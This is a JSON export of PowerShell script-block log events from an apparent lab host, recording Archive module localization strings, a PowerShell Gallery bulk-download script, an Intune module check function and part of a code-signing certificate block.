{
    "events": [
        {
            "@timestamp": "2025-12-23T17:46:34.000Z",
            "event": {
                "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2025-12-23T19:07:25.192699800Z'/><EventRecordID>29083</EventRecordID><Correlation ActivityID='{db39f876-742b-0001-9f1d-3adb2b74dc01}'/><Execution ProcessID='2012' ThreadID='4724'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>kingslanding.sevenkingdoms.local</Computer><Security UserID='S-1-5-21-2217717690-3992057368-3456976211-1000'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'># Localized\t11/02/2018 05:13 AM (GMT)\t303:6.40.10614 \tArchiveResources.psd1\r\n# Localized ArchiveResources.psd1\r\n\r\nConvertFrom-StringData @'\r\n###PSLOC\r\nPathNotFoundError=The path '{0}' either does not exist or is not a valid file system path.\r\nExpandArchiveInValidDestinationPath=The path '{0}' is not a valid file system directory path.\r\nInvalidZipFileExtensionError={0} is not a supported archive file format. {1} is the only supported archive file format.\r\nArchiveFileIsReadOnly=The attributes of the archive file {0} is set to 'ReadOnly' hence it cannot be updated. If you intend to update the existing archive file, remove the 'ReadOnly' attribute on the archive file else use -Force parameter to override and create a new archive file.\r\nZipFileExistError=The archive file {0} already exists. Use the -Update parameter to update the existing archive file or use the -Force parameter to overwrite the existing archive file.\r\nDuplicatePathFoundError=The input to {0} parameter contains a duplicate path '{1}'. Provide a unique set of paths as input to {2} parameter.\r\nArchiveFileIsEmpty=The archive file {0} is empty.\r\nCompressProgressBarText=The archive file '{0}' creation is in progress...\r\nExpandProgressBarText=The archive file '{0}' expansion is in progress...\r\nAppendArchiveFileExtensionMessage=The archive file path '{0}' supplied to the DestinationPath patameter does not include .zip extension. Hence .zip is appended to the supplied DestinationPath path and the archive file would be created at '{1}'.\r\nAddItemtoArchiveFile=Adding '{0}'.\r\nBadArchiveEntry=Can not process invalid archive entry '{0}'.\r\nCreateFileAtExpandedPath=Created '{0}'.\r\nInvalidArchiveFilePathError=The archive file path '{0}' specified as input to the {1} parameter is resolving to multiple file system paths. Provide a unique path to the {2} parameter where the archive file has to be created.\r\nInvalidExpandedDirPathError=The directory path '{0}' specified as input to the DestinationPath parameter is resolving to multiple file system paths. Provide a unique path to the Destination parameter where the archive file contents have to be expanded.\r\nFileExistsError=Failed to create file '{0}' while expanding the archive file '{1}' contents as the file '{2}' already exists. Use the -Force parameter if you want to overwrite the existing directory '{3}' contents when expanding the archive file.\r\nDeleteArchiveFile=The partially created archive file '{0}' is deleted as it is not usable.\r\nInvalidDestinationPath=The destination path '{0}' does not contain a valid archive file name.\r\nPreparingToCompressVerboseMessage=Preparing to compress...\r\nPreparingToExpandVerboseMessage=Preparing to expand...\r\n###PSLOC\r\n'@\r\n</Data><Data Name='ScriptBlockId'>65d35784-b843-41a1-8ff1-2ce1ae9edf07</Data><Data Name='Path'></Data></EventData><RenderingInfo Culture='en-US'><Message>Creating Scriptblock text (1 of 1):\r\n# Localized\t11/02/2018 05:13 AM (GMT)\t303:6.40.10614 \tArchiveResources.psd1\r\n# Localized ArchiveResources.psd1\r\n\r\nConvertFrom-StringData @'\r\n###PSLOC\r\nPathNotFoundError=The path '{0}' either does not exist or is not a valid file system path.\r\nExpandArchiveInValidDestinationPath=The path '{0}' is not a valid file system directory path.\r\nInvalidZipFileExtensionError={0} is not a supported archive file format. {1} is the only supported archive file format.\r\nArchiveFileIsReadOnly=The attributes of the archive file {0} is set to 'ReadOnly' hence it cannot be updated. If you intend to update the existing archive file, remove the 'ReadOnly' attribute on the archive file else use -Force parameter to override and create a new archive file.\r\nZipFileExistError=The archive file {0} already exists. Use the -Update parameter to update the existing archive file or use the -Force parameter to overwrite the existing archive file.\r\nDuplicatePathFoundError=The input to {0} parameter contains a duplicate path '{1}'. Provide a unique set of paths as input to {2} parameter.\r\nArchiveFileIsEmpty=The archive file {0} is empty.\r\nCompressProgressBarText=The archive file '{0}' creation is in progress...\r\nExpandProgressBarText=The archive file '{0}' expansion is in progress...\r\nAppendArchiveFileExtensionMessage=The archive file path '{0}' supplied to the DestinationPath patameter does not include .zip extension. Hence .zip is appended to the supplied DestinationPath path and the archive file would be created at '{1}'.\r\nAddItemtoArchiveFile=Adding '{0}'.\r\nBadArchiveEntry=Can not process invalid archive entry '{0}'.\r\nCreateFileAtExpandedPath=Created '{0}'.\r\nInvalidArchiveFilePathError=The archive file path '{0}' specified as input to the {1} parameter is resolving to multiple file system paths. Provide a unique path to the {2} parameter where the archive file has to be created.\r\nInvalidExpandedDirPathError=The directory path '{0}' specified as input to the DestinationPath parameter is resolving to multiple file system paths. Provide a unique path to the Destination parameter where the archive file contents have to be expanded.\r\nFileExistsError=Failed to create file '{0}' while expanding the archive file '{1}' contents as the file '{2}' already exists. Use the -Force parameter if you want to overwrite the existing directory '{3}' contents when expanding the archive file.\r\nDeleteArchiveFile=The partially created archive file '{0}' is deleted as it is not usable.\r\nInvalidDestinationPath=The destination path '{0}' does not contain a valid archive file name.\r\nPreparingToCompressVerboseMessage=Preparing to compress...\r\nPreparingToExpandVerboseMessage=Preparing to expand...\r\n###PSLOC\r\n'@\r\n\r\n\r\nScriptBlock ID: 65d35784-b843-41a1-8ff1-2ce1ae9edf07\r\nPath: </Message><Level>Verbose</Level><Task>Execute a Remote Command</Task><Opcode>On create calls</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event>",
                "code": "4104",
                "kind": "event",
                "provider": "Microsoft-Windows-PowerShell"
            },
            "winlog": {
                "event_data": {
                    "MessageNumber": "1",
                    "MessageTotal": "1",
                    "ScriptBlockText": "# Localized\t11/02/2018 05:13 AM (GMT)\t303:6.40.10614 \tArchiveResources.psd1\n# Localized ArchiveResources.psd1\n\nConvertFrom-StringData @'\n###PSLOC\nPathNotFoundError=The path '{0}' either does not exist or is not a valid file system path.\nExpandArchiveInValidDestinationPath=The path '{0}' is not a valid file system directory path.\nInvalidZipFileExtensionError={0} is not a supported archive file format. {1} is the only supported archive file format.\nArchiveFileIsReadOnly=The attributes of the archive file {0} is set to 'ReadOnly' hence it cannot be updated. If you intend to update the existing archive file, remove the 'ReadOnly' attribute on the archive file else use -Force parameter to override and create a new archive file.\nZipFileExistError=The archive file {0} already exists. Use the -Update parameter to update the existing archive file or use the -Force parameter to overwrite the existing archive file.\nDuplicatePathFoundError=The input to {0} parameter contains a duplicate path '{1}'. Provide a unique set of paths as input to {2} parameter.\nArchiveFileIsEmpty=The archive file {0} is empty.\nCompressProgressBarText=The archive file '{0}' creation is in progress...\nExpandProgressBarText=The archive file '{0}' expansion is in progress...\nAppendArchiveFileExtensionMessage=The archive file path '{0}' supplied to the DestinationPath patameter does not include .zip extension. Hence .zip is appended to the supplied DestinationPath path and the archive file would be created at '{1}'.\nAddItemtoArchiveFile=Adding '{0}'.\nBadArchiveEntry=Can not process invalid archive entry '{0}'.\nCreateFileAtExpandedPath=Created '{0}'.\nInvalidArchiveFilePathError=The archive file path '{0}' specified as input to the {1} parameter is resolving to multiple file system paths. Provide a unique path to the {2} parameter where the archive file has to be created.\nInvalidExpandedDirPathError=The directory path '{0}' specified as input to the DestinationPath parameter is resolving to multiple file system paths. Provide a unique path to the Destination parameter where the archive file contents have to be expanded.\nFileExistsError=Failed to create file '{0}' while expanding the archive file '{1}' contents as the file '{2}' already exists. Use the -Force parameter if you want to overwrite the existing directory '{3}' contents when expanding the archive file.\nDeleteArchiveFile=The partially created archive file '{0}' is deleted as it is not usable.\nInvalidDestinationPath=The destination path '{0}' does not contain a valid archive file name.\nPreparingToCompressVerboseMessage=Preparing to compress...\nPreparingToExpandVerboseMessage=Preparing to expand...\n###PSLOC\n'@",
                    "ScriptBlockId": "50d2dbda-7361-4926-a94d-d9eadfdb43fa"
                }
            }
        },
        {
            "@timestamp": "2025-12-23T19:07:20.547Z",
            "event": {
                "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2025-12-23T19:07:20.547168300Z'/><EventRecordID>29082</EventRecordID><Correlation ActivityID='{db39f876-742b-0001-961d-3adb2b74dc01}'/><Execution ProcessID='2012' ThreadID='4724'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>kingslanding.sevenkingdoms.local</Computer><Security UserID='S-1-5-21-2217717690-3992057368-3456976211-1000'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>param([int]$Top=1000)\n\n$ErrorActionPreference='Stop'\ntry { [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12 } catch {}\n\n$base = 'https://www.powershellgallery.com/api/v2/Search()'\n$nsAtom='http://www.w3.org/2005/Atom'\n$nsData='http://schemas.microsoft.com/ado/2007/08/dataservices'\n\n$seen = New-Object 'System.Collections.Generic.HashSet[string]'\n$skip=0; $page=100; $done=0\n\nwhile($done -lt $Top){\n  $take = [math]::Min($page, $Top-$done)\n  $u = \"{0}?`$filter=IsLatestVersion%20and%20substringof('PSScript'%2CTags)&amp;searchTerm=''&amp;targetFramework=''&amp;includePrerelease=false&amp;`$orderby=DownloadCount%20desc&amp;`$skip={1}&amp;`$top={2}\" -f $base,$skip,$take\n\n  [xml]$x = (Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 60).Content\n  $ns = New-Object System.Xml.XmlNamespaceManager($x.NameTable)\n  $ns.AddNamespace('a',$nsAtom); $ns.AddNamespace('d',$nsData)\n\n  $entries = $x.SelectNodes('//a:entry',$ns)\n  if(-not $entries -or -not $entries.Count){ break }\n\n  foreach($e in $entries){\n    if($done -ge $Top){ break }\n\n    $id  = $e.SelectSingleNode('.//d:Id',$ns).InnerText\n    $ver = $e.SelectSingleNode('.//d:Version',$ns).InnerText\n    if(-not $id -or -not $ver -or -not $seen.Add(\"$id|$ver\")){ continue }\n\n    try{\n      $zip = Join-Path $PWD (\"zip\\{0}.{1}.zip\" -f $id,$ver)\n      Invoke-WebRequest -Uri (\"https://www.powershellgallery.com/api/v2/package/{0}/{1}\" -f $id,$ver) -OutFile $zip -UseBasicParsing -TimeoutSec 120\n\n      $tmp = Join-Path $env:TEMP (\"psg_\"+[guid]::NewGuid().ToString('n'))\n      New-Item -ItemType Directory -Path $tmp | Out-Null\n      Expand-Archive -LiteralPath $zip -DestinationPath $tmp -Force\n\n      $ps1 = Get-ChildItem $tmp -Recurse -Filter (\"{0}.ps1\" -f $id) | Select-Object -First 1\n      if($ps1){ Copy-Item $ps1.FullName (Join-Path $PWD (\"{0}.ps1\" -f $id)) -Force; \"$id $ver OK\" }\n      else { \"$id $ver NOFILE\" }\n\n      Remove-Item $tmp -Recurse -Force\n    } catch {\n      \"$id $ver FAIL: $($_.Exception.Message)\"\n    }\n\n    $done++\n  }\n\n  $skip += $take\n}\n</Data><Data Name='ScriptBlockId'>977643d2-57ae-4a85-a6a4-2421d9167dbd</Data><Data Name='Path'></Data></EventData><RenderingInfo Culture='en-US'><Message>Creating Scriptblock text (1 of 1):\r\nparam([int]$Top=1000)\n\n$ErrorActionPreference='Stop'\ntry { [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12 } catch {}\n\n$base = 'https://www.powershellgallery.com/api/v2/Search()'\n$nsAtom='http://www.w3.org/2005/Atom'\n$nsData='http://schemas.microsoft.com/ado/2007/08/dataservices'\n\n$seen = New-Object 'System.Collections.Generic.HashSet[string]'\n$skip=0; $page=100; $done=0\n\nwhile($done -lt $Top){\n  $take = [math]::Min($page, $Top-$done)\n  $u = \"{0}?`$filter=IsLatestVersion%20and%20substringof('PSScript'%2CTags)&amp;searchTerm=''&amp;targetFramework=''&amp;includePrerelease=false&amp;`$orderby=DownloadCount%20desc&amp;`$skip={1}&amp;`$top={2}\" -f $base,$skip,$take\n\n  [xml]$x = (Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 60).Content\n  $ns = New-Object System.Xml.XmlNamespaceManager($x.NameTable)\n  $ns.AddNamespace('a',$nsAtom); $ns.AddNamespace('d',$nsData)\n\n  $entries = $x.SelectNodes('//a:entry',$ns)\n  if(-not $entries -or -not $entries.Count){ break }\n\n  foreach($e in $entries){\n    if($done -ge $Top){ break }\n\n    $id  = $e.SelectSingleNode('.//d:Id',$ns).InnerText\n    $ver = $e.SelectSingleNode('.//d:Version',$ns).InnerText\n    if(-not $id -or -not $ver -or -not $seen.Add(\"$id|$ver\")){ continue }\n\n    try{\n      $zip = Join-Path $PWD (\"zip\\{0}.{1}.zip\" -f $id,$ver)\n      Invoke-WebRequest -Uri (\"https://www.powershellgallery.com/api/v2/package/{0}/{1}\" -f $id,$ver) -OutFile $zip -UseBasicParsing -TimeoutSec 120\n\n      $tmp = Join-Path $env:TEMP (\"psg_\"+[guid]::NewGuid().ToString('n'))\n      New-Item -ItemType Directory -Path $tmp | Out-Null\n      Expand-Archive -LiteralPath $zip -DestinationPath $tmp -Force\n\n      $ps1 = Get-ChildItem $tmp -Recurse -Filter (\"{0}.ps1\" -f $id) | Select-Object -First 1\n      if($ps1){ Copy-Item $ps1.FullName (Join-Path $PWD (\"{0}.ps1\" -f $id)) -Force; \"$id $ver OK\" }\n      else { \"$id $ver NOFILE\" }\n\n      Remove-Item $tmp -Recurse -Force\n    } catch {\n      \"$id $ver FAIL: $($_.Exception.Message)\"\n    }\n\n    $done++\n  }\n\n  $skip += $take\n}\n\r\n\r\nScriptBlock ID: 977643d2-57ae-4a85-a6a4-2421d9167dbd\r\nPath: </Message><Level>Verbose</Level><Task>Execute a Remote Command</Task><Opcode>On create calls</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event>",
                "code": "4104",
                "kind": "event",
                "provider": "Microsoft-Windows-PowerShell"
            },
            "winlog": {
                "event_data": {
                    "MessageNumber": "1",
                    "MessageTotal": "1",
                    "ScriptBlockText": "param([int]$Top=1000)\n\n$ErrorActionPreference='Stop'\ntry { [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12 } catch {}\n\n$base = 'https://www.powershellgallery.com/api/v2/Search()'\n$nsAtom='http://www.w3.org/2005/Atom'\n$nsData='http://schemas.microsoft.com/ado/2007/08/dataservices'\n\n$seen = New-Object 'System.Collections.Generic.HashSet[string]'\n$skip=0; $page=100; $done=0\n\nwhile($done -lt $Top){\n  $take = [math]::Min($page, $Top-$done)\n  $u = \"{0}?`$filter=IsLatestVersion%20and%20substringof('PSScript'%2CTags)&searchTerm=''&targetFramework=''&includePrerelease=false&`$orderby=DownloadCount%20desc&`$skip={1}&`$top={2}\" -f $base,$skip,$take\n\n  [xml]$x = (Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 60).Content\n  $ns = New-Object System.Xml.XmlNamespaceManager($x.NameTable)\n  $ns.AddNamespace('a',$nsAtom); $ns.AddNamespace('d',$nsData)\n\n  $entries = $x.SelectNodes('//a:entry',$ns)\n  if(-not $entries -or -not $entries.Count){ break }\n\n  foreach($e in $entries){\n    if($done -ge $Top){ break }\n\n    $id  = $e.SelectSingleNode('.//d:Id',$ns).InnerText\n    $ver = $e.SelectSingleNode('.//d:Version',$ns).InnerText\n    if(-not $id -or -not $ver -or -not $seen.Add(\"$id|$ver\")){ continue }\n\n    try{\n      $zip = Join-Path $PWD (\"zip\\{0}.{1}.zip\" -f $id,$ver)\n      Invoke-WebRequest -Uri (\"https://www.powershellgallery.com/api/v2/package/{0}/{1}\" -f $id,$ver) -OutFile $zip -UseBasicParsing -TimeoutSec 120\n\n      $tmp = Join-Path $env:TEMP (\"psg_\"+[guid]::NewGuid().ToString('n'))\n      New-Item -ItemType Directory -Path $tmp | Out-Null\n      Expand-Archive -LiteralPath $zip -DestinationPath $tmp -Force\n\n      $ps1 = Get-ChildItem $tmp -Recurse -Filter (\"{0}.ps1\" -f $id) | Select-Object -First 1\n      if($ps1){ Copy-Item $ps1.FullName (Join-Path $PWD (\"{0}.ps1\" -f $id)) -Force; \"$id $ver OK\" }\n      else { \"$id $ver NOFILE\" }\n\n      Remove-Item $tmp -Recurse -Force\n    } catch {\n      \"$id $ver FAIL: $($_.Exception.Message)\"\n    }\n\n    $done++\n  }\n\n  $skip += $take\n}",
                    "ScriptBlockId": "977643d2-57ae-4a85-a6a4-2421d9167dbd"
                }
            }
        },
        {
            "@timestamp": "2025-12-23T19:03:58.954Z",
            "event": {
                "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2025-12-23T19:03:58.954584900Z'/><EventRecordID>35767</EventRecordID><Correlation ActivityID='{118041f9-7434-0001-34b0-81113474dc01}'/><Execution ProcessID='7016' ThreadID='1432'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>kingslanding.sevenkingdoms.local</Computer><Security UserID='S-1-5-21-2217717690-3992057368-3456976211-1000'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>function Verify-IntuneModuleExistence {\r\n\r\n    # Check that we have Intune Powershell Module available\r\n    # either in installed modules or .psd1 file in same directory\r\n    $IntunePowershellModulePath = \"$PSScriptRoot/Microsoft.Graph.Intune.psd1\"\r\n\r\n    # If we don't have Intune module installed\r\n    if (-not (Get-Module -ListAvailable -Name 'Microsoft.Graph.Intune')) {\r\n\r\n        # As backup check if we happen to have module as file in our current directory\r\n        if (-Not (Test-Path $IntunePowershellModulePath)) {\r\n\r\n            # Intune Powershell module not found!\r\n            Write-Host \"Could not find Intune Powershell module (Microsoft.Graph.Intune)\"\r\n            Write-Host \"You can install Intune module with command: Install-Module -Name Microsoft.Graph.Intune\"\r\n            Write-Host \"More information: https://github.com/microsoft/Intune-PowerShell-SDK\"\r\n            Write-Host \"Script will exit...\"\r\n            Pause\r\n            Exit 0\r\n\r\n        }\r\n        else {\r\n            Import-Module \"$IntunePowershellModulePath\"\r\n            $Success = $?\r\n\r\n            # If import-module import failed\r\n            if (-not ($Success)) {\r\n                # Intune Powershell module import failed!\r\n                Write-Error \"Could not load Intune module from file $IntunePowershellModulePath\"\r\n                Write-Host \"Double check you have Intune Powershell Module installed and try again.\"\r\n                Write-Host \"You can install Intune module with command: Install-Module -Name Microsoft.Graph.Intune\"\r\n                Write-Host \"More information: https://github.com/microsoft/Intune-PowerShell-SDK\"\r\n                Pause\r\n                Exit 0\r\n            }\r\n            else {\r\n                Write-Host \"Successfully imported Intune-module from file: $IntunePowershellModulePath\"\r\n            }\r\n        }\r\n    }\r\n    else {\r\n        Write-Host \"Microsoft.Graph.Intune module found.\"\r\n        return $true\r\n    }\r\n}</Data><Data Name='ScriptBlockId'>f6c60bb6-33ff-4e16-b7b0-767902011230</Data><Data Name='Path'>C:\\Users\\vagrant\\posh\\Create-IntuneAppAssignmentsReport.ps1</Data></EventData><RenderingInfo Culture='en-US'><Message>Creating Scriptblock text (1 of 1):\r\nfunction Verify-IntuneModuleExistence {\r\n\r\n    # Check that we have Intune Powershell Module available\r\n    # either in installed modules or .psd1 file in same directory\r\n    $IntunePowershellModulePath = \"$PSScriptRoot/Microsoft.Graph.Intune.psd1\"\r\n\r\n    # If we don't have Intune module installed\r\n    if (-not (Get-Module -ListAvailable -Name 'Microsoft.Graph.Intune')) {\r\n\r\n        # As backup check if we happen to have module as file in our current directory\r\n        if (-Not (Test-Path $IntunePowershellModulePath)) {\r\n\r\n            # Intune Powershell module not found!\r\n            Write-Host \"Could not find Intune Powershell module (Microsoft.Graph.Intune)\"\r\n            Write-Host \"You can install Intune module with command: Install-Module -Name Microsoft.Graph.Intune\"\r\n            Write-Host \"More information: https://github.com/microsoft/Intune-PowerShell-SDK\"\r\n            Write-Host \"Script will exit...\"\r\n            Pause\r\n            Exit 0\r\n\r\n        }\r\n        else {\r\n            Import-Module \"$IntunePowershellModulePath\"\r\n            $Success = $?\r\n\r\n            # If import-module import failed\r\n            if (-not ($Success)) {\r\n                # Intune Powershell module import failed!\r\n                Write-Error \"Could not load Intune module from file $IntunePowershellModulePath\"\r\n                Write-Host \"Double check you have Intune Powershell Module installed and try again.\"\r\n                Write-Host \"You can install Intune module with command: Install-Module -Name Microsoft.Graph.Intune\"\r\n                Write-Host \"More information: https://github.com/microsoft/Intune-PowerShell-SDK\"\r\n                Pause\r\n                Exit 0\r\n            }\r\n            else {\r\n                Write-Host \"Successfully imported Intune-module from file: $IntunePowershellModulePath\"\r\n            }\r\n        }\r\n    }\r\n    else {\r\n        Write-Host \"Microsoft.Graph.Intune module found.\"\r\n        return $true\r\n    }\r\n}\r\n\r\nScriptBlock ID: f6c60bb6-33ff-4e16-b7b0-767902011230\r\nPath: C:\\Users\\vagrant\\posh\\Create-IntuneAppAssignmentsReport.ps1</Message><Level>Verbose</Level><Task>Execute a Remote Command</Task><Opcode>On create calls</Opcode><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Provider></Provider><Keywords></Keywords></RenderingInfo></Event>",
                "code": "4104",
                "kind": "event",
                "provider": "Microsoft-Windows-PowerShell"
            },
            "winlog": {
                "event_data": {
                    "MessageNumber": "1",
                    "MessageTotal": "1",
                    "ScriptBlockText": "function Verify-IntuneModuleExistence {\n\n    # Check that we have Intune Powershell Module available\n    # either in installed modules or .psd1 file in same directory\n    $IntunePowershellModulePath = \"$PSScriptRoot/Microsoft.Graph.Intune.psd1\"\n\n    # If we don't have Intune module installed\n    if (-not (Get-Module -ListAvailable -Name 'Microsoft.Graph.Intune')) {\n\n        # As backup check if we happen to have module as file in our current directory\n        if (-Not (Test-Path $IntunePowershellModulePath)) {\n\n            # Intune Powershell module not found!\n            Write-Host \"Could not find Intune Powershell module (Microsoft.Graph.Intune)\"\n            Write-Host \"You can install Intune module with command: Install-Module -Name Microsoft.Graph.Intune\"\n            Write-Host \"More information: https://github.com/microsoft/Intune-PowerShell-SDK\"\n            Write-Host \"Script will exit...\"\n            Pause\n            Exit 0\n\n        }\n        else {\n            Import-Module \"$IntunePowershellModulePath\"\n            $Success = $?\n\n            # If import-module import failed\n            if (-not ($Success)) {\n                # Intune Powershell module import failed!\n                Write-Error \"Could not load Intune module from file $IntunePowershellModulePath\"\n                Write-Host \"Double check you have Intune Powershell Module installed and try again.\"\n                Write-Host \"You can install Intune module with command: Install-Module -Name Microsoft.Graph.Intune\"\n                Write-Host \"More information: https://github.com/microsoft/Intune-PowerShell-SDK\"\n                Pause\n                Exit 0\n            }\n            else {\n                Write-Host \"Successfully imported Intune-module from file: $IntunePowershellModulePath\"\n            }\n        }\n    }\n    else {\n        Write-Host \"Microsoft.Graph.Intune module found.\"\n        return $true\n    }\n}",
                    "ScriptBlockId": "f6c60bb6-33ff-4e16-b7b0-767902011230"
                }
            }
        },
        {
            "@timestamp": "2025-12-23T19:03:45.637Z",
            "event": {
                "original": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{a0c1853b-5c40-4b15-8766-3cf1c58f985a}'/><EventID>4104</EventID><Version>1</Version><Level>3</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2025-12-23T19:03:45.637961500Z'/><EventRecordID>35701</EventRecordID><Correlation ActivityID='{118041f9-7434-0001-93ae-81113474dc01}'/><Execution ProcessID='10188' ThreadID='3924'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>kingslanding.sevenkingdoms.local</Computer><Security UserID='S-1-5-21-2217717690-3992057368-3456976211-1000'/></System><EventData><Data Name='MessageNumber'>5</Data><Data Name='MessageTotal'>5</Data><Data Name='ScriptBlockText'>yMNxE2DF7vFdvaiZP0CVZ5ByJ2gAhXMdK9+usx\r\n# zVk913qKde1OAuWdv+rndqkAIm8fUlRnr4saSCg7cIbUwCCf116wUJ7EuJDg0vHe\r\n# yhnCeHnBbyH3RZkHEi2ofmfgnFISJZDdMAeVZGVOh20Jp50XBzqokpPzeZ6zc1/g\r\n# yILNyiVgE+RPkjnUQshd1f1PMgn3tns2Cz7bJiVUaqEO3n9qRFgy5JuLae6UweGf\r\n# AeOo3dgLZxikKzYs3hDMaEtJq8IP71cX7QXe6lnMmXU/Hdfz2p897Zd+kU+vZvKI\r\n# 3cwLfuVQgK2RZ2z+Kc3K3dRPz2rXycK5XCuRZmvGab/WbrZiC7wJQapgBodltMI5\r\n# GMdFrBg9IeF7/rP4EqVQXeKtevTlZXjpuNhhjuR+2DMt/dWufjXpiW91bo3aH6Ea\r\n# jOALXmoxgltCp1K7hrS6gmsvj94cLRf50QQ4U8Qwggd6MIIFYqADAgECAgphDpDS\r\n# AAAAAAADMA0GCSqGSIb3DQEBCwUAMIGIMQswCQYDVQQGEwJVUzETMBEGA1UECBMK\r\n# V2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDEeMBwGA1UEChMVTWljcm9zb2Z0\r\n# IENvcnBvcmF0aW9uMTIwMAYDVQQDEylNaWNyb3NvZnQgUm9vdCBDZXJ0aWZpY2F0\r\n# ZSBBdXRob3JpdHkgMjAxMTAeFw0xMTA3MDgyMDU5MDlaFw0yNjA3MDgyMTA5MDla\r\n# MH4xCzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpXYXNoaW5ndG9uMRAwDgYDVQQHEwdS\r\n# ZWRtb25kMR4wHAYDVQQKExVNaWNyb3NvZnQgQ29ycG9yYXRpb24xKDAmBgNVBAMT\r\n# H01pY3Jvc29mdCBDb2RlIFNpZ25pbmcgUENBIDIwMTEwggIiMA0GCSqGSIb3DQEB\r\n# AQUAA4ICDwAwggIKAoICAQCr8PpyEBwurdhuqoIQTTS68rZYIZ9CGypr6VpQqrgG\r\n# OBoESbp/wwwe3TdrxhLYC/A4wpkGsMg51QEUMULTiQ15ZId+lGAkbK+eSZzpaF7S\r\n# 35tTsgosw6/ZqSuuegmv15ZZymAaBelmdugyUiYSL+erCFDPs0S3XdjELgN1q2jz\r\n# y23zOlyhFvRGuuA4ZKxuZDV4pqBjDy3TQJP4494HDdVceaVJKecNvqATd76UPe/7\r\n# 4ytaEB9NViiienLgEjq3SV7Y7e1DkYPZe7J7hhvZPrGMXeiJT4Qa8qEvWeSQOy2u\r\n# M1jFtz7+MtOzAz2xsq+SOH7SnYAs9U5WkSE1JcM5bmR/U7qcD60ZI4TL9LoDho33\r\n# X/DQUr+MlIe8wCF0JV8YKLbMJyg4JZg5SjbPfLGSrhwjp6lm7GEfauEoSZ1fiOIl\r\n# XdMhSz5SxLVXPyQD8NF6Wy/VI+NwXQ9RRnez+ADhvKwCgl/bwBWzvRvUVUvnOaEP\r\n# 6SNJvBi4RHxF5MHDcnrgcuck379GmcXvwhxX24ON7E1JMKerjt/sW5+v/N2wZuLB\r\n# l4F77dbtS+dJKacTKKanfWeA5opieF+yL4TXV5xcv3coKPHtbcMojyyPQDdPweGF\r\n# RInECUzF1KVDL3SV9274eCBYLBNdYJWaPk8zhNqwiBfenk70lrC8RqBsmNLg1oiM\r\n# CwIDAQABo4IB7TCCAekwEAYJKwYBBAGCNxUBBAMCAQAwHQYDVR0OBBYEFEhuZOVQ\r\n# BdOCqhc3NyK1bajKdQKVMBkGCSsGAQQBgjcUAgQMHgoAUwB1AGIAQwBBMAsGA1Ud\r\n# DwQEAwIBhjAPBgNVHRMBAf8EBTADAQH/MB8GA1UdIwQYMBaAFHItOgIxkEO5FAVO\r\n# 4eqnxzHRI4k0MFoGA1UdHwRTMFEwT6BNoEuGSWh0dHA6Ly9jcmwubWljcm9zb2Z0\r\n# LmNvbS9wa2kvY3JsL3Byb2R1Y3RzL01pY1Jvb0NlckF1dDIwMTFfMjAxMV8wM18y\r\n# Mi5jcmwwXgYIKwYBBQUHAQEEUjBQME4GCCsGAQUFBzAChkJodHRwOi8vd3d3Lm1p\r\n# Y3Jvc29mdC5jb20vcGtpL2NlcnRzL01pY1Jvb0NlckF1dDIwMTFfMjAxMV8wM18y\r\n# Mi5jcnQwgZ8GA1UdIASBlzCBlDCBkQYJKwYBBAGCNy4DMIGDMD8GCCsGAQUFBwIB\r\n# FjNodHRwOi8vd3d3Lm1pY3Jvc29mdC5jb20vcGtpb3BzL2RvY3MvcHJpbWFyeWNw\r\n# cy5odG0wQAYIKwYBBQUHAgIwNB4yIB0ATABlAGcAYQBsAF8AcABvAGwAaQBjAHkA\r\n# XwBzAHQAYQB0AGUAbQBlAG4AdAAuIB0wDQYJKoZIhvcNAQELBQADggIBAGfyhqWY\r\n# 4FR5Gi7T2HRnIpsLlhHhY5KZQpZ90nkMkMFlXy4sPvjDctFtg/6+P+gKyju/R6mj\r\n# 82nbY78iNaWXXWWEkH2LRlBV2AySfNIaSxzzPEKLUtCw/WvjPgcuKZvmPRul1LUd\r\n# 